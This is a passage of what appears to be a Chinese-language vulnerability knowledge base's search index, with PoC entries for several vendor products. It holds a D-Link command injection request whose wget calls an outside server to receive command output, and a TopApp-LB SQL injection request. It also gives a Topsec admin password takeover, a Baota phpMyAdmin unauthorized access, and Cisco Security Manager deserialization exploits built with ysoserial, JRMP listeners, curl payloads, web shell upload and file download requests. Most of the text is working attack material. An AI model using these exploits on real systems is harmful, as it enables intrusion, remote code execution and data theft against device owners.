\u6839\u636e\u4f5c\u8005\u62ab\u9732\u7684\u53d7\u5f71\u54cd\u578b\u53f7\u4e3a\uff1a \u00b6 DIR-655 DIR-866L DIR-652 DHP-1565 POC \u5982\u4e0b \u00b6 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u5c06\u4efb\u610f\u5b57\u7b26\u4e32\u53d1\u9001\u5230\u201cPingTest\u201d\u7f51\u5173\u63a5\u53e3\u6765\u5b9e\u73b0\u547d\u4ee4\u6ce8\u5165\u3002 POST /apply_sec.cgi HTTP/1.1 Host: 192.168.232.128 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 131 Connection: close Referer: http://192.168.232.128/login_pic.asp Cookie: uid=1234123 Upgrade-Insecure-Requests: 1 html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234) \u201c\u8be5\u6f0f\u6d1e\u59cb\u4e8e\u4e00\u6b21\u9519\u8bef\u7684\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u3002\u5f53\u6211\u4eec\u8981\u8fdb\u5165\u7ba1\u7406\u9875\u9762\u65f6\uff0c\u9700\u8981\u6267\u884c\u767b\u5f55\u64cd\u4f5c\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u4f1a\u5bf9 apply_sec.cgi \u9875\u9762\u53d1\u51fa POST \u8bf7\u6c42\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u64cd\u4f5c ping_test \u3002\u7814\u7a76\u540e\u53d1\u73b0\uff0c\u6211\u4eec\u53ef\u901a\u8fc7\u53c2\u6570 ping_ipaddr \u6267\u884c\u547d\u4ee4\u6ce8\u5165\u3002\u867d\u7136\u54cd\u5e94\u662f\u8fd4\u56de\u767b\u5f55\u9875\u9762\uff0c\u4f46\u64cd\u4f5c ping_test \u4ecd\u7136\u6267\u884c\u4e86\uff0c\u6211\u4eec\u901a\u8fc7\u53c2\u6570 ping_ipaddr \u6ce8\u5165\u7684\u547d\u4ee4 echo 1234 \u6210\u529f\u6267\u884c\uff0c\u5e76\u5c06\u7ed3\u679c\u53d1\u9001\u56de\u6211\u4eec\u7684\u670d\u52a1\u5668\u3002\u201d \u4e13\u5bb6\u4eec\u53d1\u73b0\uff0c\u7531\u4e8e\u7cdf\u7cd5\u7684\u8eab\u4efd\u6743\u9650\u68c0\u67e5\uff0c\u5373\u4f7f\u65e0\u7528\u6237\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u3002 \u7814\u7a76\u4eba\u5458\u57289\u670822\u65e5\u5411D-Link\u62a5\u544a\u4e86\u6f0f\u6d1e\uff0c\u800c\u5382\u5546\u5728\u4e24\u5929\u540e\u627f\u8ba4\u6f0f\u6d1e\u5b58\u5728\uff0c\u5e76\u5728\u4e09\u5929\u540e\u786e\u8ba4\u4e0d\u4f1a\u53d1\u5e03\u76f8\u5173\u8865\u4e01\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u4ea7\u54c1\u90fd\u5df2\u7ecf\u5230\u4e86\u751f\u547d\u5468\u671f\u7684\u7ec8\u70b9\u3002","title":"CVE 2019 16920 D Link \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#d-linkrce","text":"","title":"D-Link\u8def\u7531\u5668\u66dd\u51faRCE\u6f0f\u6d1e\uff0c\u7275\u6d89\u591a\u4e2a\u578b\u53f7"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_1","text":"Fortinet\u65d7\u4e0bFortiGuard\u5b9e\u9a8c\u5ba4\u7684\u7814\u7a76\u4eba\u5458\u62ab\u9732\u4e86D-Link\u8def\u7531\u5668\u4e0a\u7684\u4e00\u4e2a\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u7275\u6d89\u591a\u4e2a\u578b\u53f7","title":"\u7b80\u4ecb"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_2","text":"https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html https://nosec.org/home/detail/3020.html","title":"\u76f8\u5173\u6587\u7ae0"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#_3","text":"DIR-655 DIR-866L DIR-652 DHP-1565","title":"\u6839\u636e\u4f5c\u8005\u62ab\u9732\u7684\u53d7\u5f71\u54cd\u578b\u53f7\u4e3a\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%8F%8B%E8%AE%AF/CVE-2019-16920-D-Link-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#poc","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u5c06\u4efb\u610f\u5b57\u7b26\u4e32\u53d1\u9001\u5230\u201cPingTest\u201d\u7f51\u5173\u63a5\u53e3\u6765\u5b9e\u73b0\u547d\u4ee4\u6ce8\u5165\u3002 POST /apply_sec.cgi HTTP/1.1 Host: 192.168.232.128 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 131 Connection: close Referer: http://192.168.232.128/login_pic.asp Cookie: uid=1234123 Upgrade-Insecure-Requests: 1 html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234) \u201c\u8be5\u6f0f\u6d1e\u59cb\u4e8e\u4e00\u6b21\u9519\u8bef\u7684\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u3002\u5f53\u6211\u4eec\u8981\u8fdb\u5165\u7ba1\u7406\u9875\u9762\u65f6\uff0c\u9700\u8981\u6267\u884c\u767b\u5f55\u64cd\u4f5c\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u4f1a\u5bf9 apply_sec.cgi \u9875\u9762\u53d1\u51fa POST \u8bf7\u6c42\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u4e2a\u64cd\u4f5c ping_test \u3002\u7814\u7a76\u540e\u53d1\u73b0\uff0c\u6211\u4eec\u53ef\u901a\u8fc7\u53c2\u6570 ping_ipaddr \u6267\u884c\u547d\u4ee4\u6ce8\u5165\u3002\u867d\u7136\u54cd\u5e94\u662f\u8fd4\u56de\u767b\u5f55\u9875\u9762\uff0c\u4f46\u64cd\u4f5c ping_test \u4ecd\u7136\u6267\u884c\u4e86\uff0c\u6211\u4eec\u901a\u8fc7\u53c2\u6570 ping_ipaddr \u6ce8\u5165\u7684\u547d\u4ee4 echo 1234 \u6210\u529f\u6267\u884c\uff0c\u5e76\u5c06\u7ed3\u679c\u53d1\u9001\u56de\u6211\u4eec\u7684\u670d\u52a1\u5668\u3002\u201d \u4e13\u5bb6\u4eec\u53d1\u73b0\uff0c\u7531\u4e8e\u7cdf\u7cd5\u7684\u8eab\u4efd\u6743\u9650\u68c0\u67e5\uff0c\u5373\u4f7f\u65e0\u7528\u6237\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\u3002 \u7814\u7a76\u4eba\u5458\u57289\u670822\u65e5\u5411D-Link\u62a5\u544a\u4e86\u6f0f\u6d1e\uff0c\u800c\u5382\u5546\u5728\u4e24\u5929\u540e\u627f\u8ba4\u6f0f\u6d1e\u5b58\u5728\uff0c\u5e76\u5728\u4e09\u5929\u540e\u786e\u8ba4\u4e0d\u4f1a\u53d1\u5e03\u76f8\u5173\u8865\u4e01\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u4ea7\u54c1\u90fd\u5df2\u7ecf\u5230\u4e86\u751f\u547d\u5468\u671f\u7684\u7ec8\u70b9\u3002","title":"POC \u5982\u4e0b"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/","text":"\u5f71\u54cd\u8303\u56f4\uff1a \u00b6 V1.2.8.0#xxx \u6f0f\u6d1e\u9a8c\u8bc1 \u00b6 \u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861 TopAPP-LB\u4ea7\u54c1\u65e7\u7248\u672c\u5728\u7ba1\u7406\u9762\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5177\u4f53\u4e3a\u5728\u53ef\u4ee5\u8bbf\u95ee\u7ba1\u7406\u670d\u52a1\u60c5\u51b5 \u4e0b\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u5229\u7528\u7cfb\u7edf\u68c0\u67e5\u8f93\u5165\u6761\u4ef6\u4e0d\u4e25\u683c\u7684\u7f3a\u9677\uff0c\u8fdb\u4e00\u6b65\u53ef\u83b7\u53d6\u90e8\u5206\u7cfb\u7edf\u672c\u5730\u4fe1\u606f\u3002 POST /acc/clsf/report/datasource.php HTTP/1.1 Host: localhost Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Accept-Language: zh-CN,zh;q=0.9 Content-Type: application/x-www-form-urlencoded t=l & e=0 & s=t & l=1 & vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+ & gid=0 & lmt=10 & o=r_Speed & asc=false & p=8 & lipf= & lipt= & ripf= & ript= & dscp= & proto= & lpf= & lpt= & rpf= & rpt=@\u3002\u3002 3\u3001\u5f71\u54cd\u7248\u672c \u00b6 V1.2.8.0#xxx \uff0c\u8be5\u7248\u672c\u5b58\u5728\u4e8e 2014\u5e74\u4e4b\u524d\u9500\u552e\u7684\u4ea7\u54c1\u3002 4\u3001\u4fee\u590d\u5efa\u8bae \u00b6 \u5982\u60a8\u6b63\u5728\u4f7f\u7528 TopAPP-LB\u4ee5\u4e0a\u7248\u672c\u4ea7\u54c1\uff0c\u8bf7\u8054\u7cfb\u5929\u878d\u4fe1\u5f53\u5730\u6280\u672f\u56e2\u961f\u6216\u8005\u5b98\u65b9\u670d\u52a1\u70ed\u7ebf\u3002","title":" "},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/#_1","text":"V1.2.8.0#xxx","title":"\u5f71\u54cd\u8303\u56f4\uff1a"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/#_2","text":"\u5929\u878d\u4fe1\u8d1f\u8f7d\u5747\u8861 TopAPP-LB\u4ea7\u54c1\u65e7\u7248\u672c\u5728\u7ba1\u7406\u9762\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5177\u4f53\u4e3a\u5728\u53ef\u4ee5\u8bbf\u95ee\u7ba1\u7406\u670d\u52a1\u60c5\u51b5 \u4e0b\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u5229\u7528\u7cfb\u7edf\u68c0\u67e5\u8f93\u5165\u6761\u4ef6\u4e0d\u4e25\u683c\u7684\u7f3a\u9677\uff0c\u8fdb\u4e00\u6b65\u53ef\u83b7\u53d6\u90e8\u5206\u7cfb\u7edf\u672c\u5730\u4fe1\u606f\u3002 POST /acc/clsf/report/datasource.php HTTP/1.1 Host: localhost Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Accept-Language: zh-CN,zh;q=0.9 Content-Type: application/x-www-form-urlencoded t=l & e=0 & s=t & l=1 & vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22--+ & gid=0 & lmt=10 & o=r_Speed & asc=false & p=8 & lipf= & lipt= & ripf= & ript= & dscp= & proto= & lpf= & lpt= & rpf= & rpt=@\u3002\u3002","title":"\u6f0f\u6d1e\u9a8c\u8bc1"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/#3","text":"V1.2.8.0#xxx \uff0c\u8be5\u7248\u672c\u5b58\u5728\u4e8e 2014\u5e74\u4e4b\u524d\u9500\u552e\u7684\u4ea7\u54c1\u3002","title":"3\u3001\u5f71\u54cd\u7248\u672c"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9Fsql%E6%B3%A8%E5%85%A5/#4","text":"\u5982\u60a8\u6b63\u5728\u4f7f\u7528 TopAPP-LB\u4ee5\u4e0a\u7248\u672c\u4ea7\u54c1\uff0c\u8bf7\u8054\u7cfb\u5929\u878d\u4fe1\u5f53\u5730\u6280\u672f\u56e2\u961f\u6216\u8005\u5b98\u65b9\u670d\u52a1\u70ed\u7ebf\u3002","title":"4\u3001\u4fee\u590d\u5efa\u8bae"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/","text":"\u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u2f46\u9700\u767b\u5f55\u6743\u9650,\u7531\u4e8e\u4fee\u6539\u5bc6\u7801\u5904\u672a\u6821\u9a8c\u539f\u5bc6\u7801,\u4e14/?module=auth_user&action=mod_edit_pwd \u63a5\u2f1d\u672a\u6388\u6743\u8bbf\u95ee,\u9020\u6210\u76f4\u63a5\u4fee\u6539\u4efb\u610f\u2f64\u6237\u5bc6\u7801\u3002:\u9ed8\u8ba4superman\u8d26\u6237uid\u4e3a1\u3002","title":"\u5929\u878d\u4fe1\u6570\u636e\u9632\u6cc4\u6f0f\u7cfb\u7edf\u8d8a\u6743\u4fee\u6539\u7ba1\u7406\u5458\u5bc6\u7801"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%A4%A9%E8%9E%8D%E4%BF%A1/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/#_1","text":"\u2f46\u9700\u767b\u5f55\u6743\u9650,\u7531\u4e8e\u4fee\u6539\u5bc6\u7801\u5904\u672a\u6821\u9a8c\u539f\u5bc6\u7801,\u4e14/?module=auth_user&action=mod_edit_pwd \u63a5\u2f1d\u672a\u6388\u6743\u8bbf\u95ee,\u9020\u6210\u76f4\u63a5\u4fee\u6539\u4efb\u610f\u2f64\u6237\u5bc6\u7801\u3002:\u9ed8\u8ba4superman\u8d26\u6237uid\u4e3a1\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u8303\u56f4 \u00b6 Linux\u9762\u677f7.4.2 Windows\u9762\u72486.8 \u6f0f\u6d1ePOC \u00b6 \u8bbf\u95ee\uff1a http://ip:888/pma \u5373\u53ef\u6210\u529f\u8fdb\u5165phpMyAdmin\u7ba1\u7406\u754c\u9762 \uff08\u9700\u8981\u5b89\u88c5\u4e86phpmyadmin\uff09","title":"\u5b9d\u5854\u9762\u677fphpMyAdmin\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","text":"Linux\u9762\u677f7.4.2 Windows\u9762\u72486.8","title":"\u6f0f\u6d1e\u8303\u56f4"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E5%AE%9D%E5%A1%94/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyAdmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#poc","text":"\u8bbf\u95ee\uff1a http://ip:888/pma \u5373\u53ef\u6210\u529f\u8fdb\u5165phpMyAdmin\u7ba1\u7406\u754c\u9762 \uff08\u9700\u8981\u5b89\u88c5\u4e86phpmyadmin\uff09","title":"\u6f0f\u6d1ePOC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/","text":"CVE-2020-27131 \u601d\u79d1\u5b89\u5168\u7ba1\u7406\u5668\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e POC \u00b6 \u7b80\u4ecb \u00b6 \u601d\u79d1\u5b89\u5168\u7ba1\u7406\u5668\u662f\u4e00\u4e2a\u4f01\u4e1a\u7ea7\u5b89\u5168\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\uff0c\u53ef\u63d0\u4f9b\u5bf9\u601d\u79d1\u5b89\u5168\u548c\u7f51\u7edc\u8bbe\u5907\u7684\u4e86\u89e3\u548c\u63a7\u5236\u3002Cisco Security Manager\u5728\u5e7f\u6cdb\u7684Cisco\u5b89\u5168\u8bbe\u5907\u4e2d\u63d0\u4f9b\u5168\u9762\u7684\u5b89\u5168\u7ba1\u7406\uff08\u914d\u7f6e\u548c\u4e8b\u4ef6\u7ba1\u7406\uff09\uff0c\u5305\u62ecCisco ASA\u81ea\u9002\u5e94\u5b89\u5168\u8bbe\u5907\uff0cCisco IPS\u7cfb\u5217\u4f20\u611f\u5668\u8bbe\u5907\uff0cCisco\u96c6\u6210\u670d\u52a1\u8def\u7531\u5668\uff08ISR\uff09\uff0cCisco\u9632\u706b\u5899\u670d\u52a1\u6a21\u5757\uff08FWSM\uff09 \uff0cCisco Catalyst\uff0cCisco\u4ea4\u6362\u673a\u7b49\u7b49\u3002Cisco Security Manager\u5141\u8bb8\u60a8\u6709\u6548\u5730\u7ba1\u7406\u5404\u79cd\u89c4\u6a21\u7684\u7f51\u7edc-\u4ece\u5c0f\u578b\u7f51\u7edc\u5230\u5305\u542b\u6570\u767e\u53f0\u8bbe\u5907\u7684\u5927\u578b\u7f51\u7edc\u3002 POC \u00b6 SecretService.jsp \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 java -cp ./commons-beanutils-1.6.1.jar:[YOUR_PATH]]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload CommonsBeanutils1 \"cmd.exe /c calc.exe\" > payload_CommonsBeanutils curl -k --request POST --data-binary \"@payload_CommonsBeanutils\" https://[TARGET_HOST]/CSCOnm/servlet/SecretService.jsp CsJaasServiceServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 Compile JaasEncryptor.java and replace the b64Payload content: import java.security.InvalidKeyException; import java.util.Base64; import com.cisco.nm.cmf.security.jaas.BlobCrypt; public class JaasEncryptor { public static void main(String args[]) { String b64Payload = \"rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3MQAKVW5pY2FzdFJlZgAIMTAuMC4wLjIAAAG7AAAAAEBnvkQAAAAAAAAAAAAAAAAAAAB4\"; byte[] payload = Base64.getDecoder().decode(b64Payload); byte[] key = new byte[]{-100, 76, -23, 87, 125, 0, 5, 94, 12, 76, 37, -84, 36, 78, 123, 5}; byte[] enc = BlobCrypt.encryptArray(payload, key); System.out.println(\"Encrypted payload: \" + Base64.getEncoder().encodeToString(enc)); byte[] dec = BlobCrypt.decryptArray(enc, key); } } Prepare JRMP Listener: java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 443 java -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]]:443' | base64 -w0 Compile encrypted payload: javac -cp [YOUR_PATH]]/server_jars_classes/jars.jar:./ JaasEncryptor2.java; java -cp [YOUR_PATH]/server_jars_classes/jars.jar:./ JaasEncryptor Send payload to Servlet with parameters cmd=data + new line + data=[ENCRYPTED_PAYLOAD] . AuthTokenServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 Prepare JRMP Listener: java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsBeanutils1 \"cmd.exe /c calc.exe\" java -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]]:1337' > payload_JRMP1_2 Send request: curl -k --request POST --data-binary \"@payload_JRMP1_2\" https://[TARGET_IP]/CSCOnm/servlet/com.cisco.nm.cmf.servlet.AuthTokenServlet ClientServicesServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 Prepare JRMP listener: java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsBeanutils1 \"cmd.exe /c calc.exe\" java -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]:1337' > payload_JRMP1_3 Send request: curl -k --request POST --data-binary \"@payload_JRMP1_3\" https://[TARGET_IP]/CSCOnm/servlet/com.cisco.nm.cmf.servlet.ClientServicesServlet CTMServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 java -cp ./commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.GeneratePayload CommonsBeanutils1 \"cmd.exe /c calc.exe\" > payload_CommonsBeanutils1_2 curl -i -s -k -X $'POST' -H $'Content-Type: application/octet-stream' -H $'CTM-URN: com-cisco-nm-vms-ipintel-IpIntelligenceApi' -H $'CTM-VERSION: 1.5' -H $'CTM-PRODUCT-ID: /C:/Program Files (x86)/CSCOpx/MDC/tomcat/vms/athena/WEB-INF/lib/' -H $'Cache-Control: no-cache' -H $'Pragma: no-cache' -H $'User-Agent: Java/1.8.0_222' -H $'Host: [TARGET_IP]' -H $'Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2' -H $'Connection: keep-alive' --data-binary \"@payload_CommonsBeanutils1_2\" $'https://[TARGET_IP]/athena/CTMServlet' XdmConfigRequestHandler\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 GET /athena/xdmProxy/xdmConfig[RELATIVE_PATH_TO_FILE] XdmResourceRequestHandler \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 GET /athena/xdmProxy/xdmResources[RELATIVE_PATH_TO_FILE]?dmTargetType=TARGET.IDS&dmOsVersion=7.&command=editConfigDelta XmpFileUploadServlet \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u00b6 Write a web shell e.g. POST /cwhp/XmpFileUploadServlet?maxFileSize=100 Normal multi-part e.g. writing web shell in filename with*../../MDC/tomcat/webapps/cwhp/testme.jsp*. XmpFileDownloadServlet \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 GET /cwhp/XmpFileDownloadServlet?parameterName=downloadDoc&downloadDirectory=[RELATIVE_PATH_TO_DIRECTORY]&readmeText=1 This will respond with a ZIP file containing all files from the directory. SampleFileDownloadServlet \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 GET /cwhp/SampleFileDownloadServlet?downloadZipFileName=pwned&downloadFiles=README&downloadLocation=[RELATIVE_PATH_TO_DIRECTORY] This will respond with a ZIP file containing all files from the directory. resultsFrame.jsp \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u00b6 GET /athena/itf/resultsFrame.jsp?filename=[RELATIVE_PATH_TO_FILE] SecretServiceServlet \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u00b6 See also https://de.tenable.com/security/research/tra-2017-23 java -cp [YOUR_PATH]/commons-beanutils-1.6.1.jar:[YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsBeanutils1 \"cmd.exe /c calc.exe\" java -jar [YOUR_PATH]/ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient '[YOUR_IP]:1337' > payload_JRMP1_2 curl -k --request POST --data-binary \"@payload_JRMP1_2\" https://[TARGET_IP]/CSCOnm/servlet/com.cisco.nm.cmf.servlet.SecretServiceServlet \u53c2\u8003 \u00b6 https://www.zdnet.com/article/cisco-reveals-this-critical-bug-in-cisco-security-manager-after-exploits-are-posted-patch-now/","title":"CVE 2020 27131 \u601d\u79d1\u5b89\u5168\u7ba1\u7406\u5668\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e POC"},{"location":"04-%E5%8E%82%E5%95%86%E6%BC%8F%E6%B4%9E/%E6%80%9D%E7%A7%91/CVE-2020-27131%20%E6%80%9D%E7%A7%91%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%99%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20POC/#cve-2020-27131-poc","text":"","title":"CVE-2020-27131 \u601d\u79d1\u5b89\u5168\u7ba1\u7406\u5668\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e 